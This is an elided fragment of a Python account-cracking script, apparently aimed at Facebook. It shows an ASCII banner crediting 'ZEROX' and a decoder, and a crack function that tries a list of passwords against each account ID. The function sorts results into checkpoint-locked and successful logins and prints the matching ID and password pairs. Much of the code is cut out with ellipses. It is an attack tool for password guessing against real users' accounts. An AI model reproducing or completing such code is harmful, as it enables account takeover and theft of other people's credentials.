...
\033[1;37m----------------------------------------------
 ...
 FACEBOOK   : ZEROX XWD
 DECODE BY  : AVINASH
\033[1;37m----𝗩𝗔𝗚𝗬𝗔 𝗥𝗔𝗠𝗥𝗢 𝗥𝗔𝗜𝗫𝗔  𝗖𝗠𝗗 𝗨𝗦𝗘 𝗚𝗔𝗥𝗡𝗔 𝗣𝗔𝗜𝗦-""")
def banner():
	print(logo)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[ZEROX-EXE]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{P}{K} [ZEROX-CP] {idf} │ {pw} {P}')
				...
				print(f'\r{P}{H} [ZEROX-OK] {idf} │ {pw} {P}')
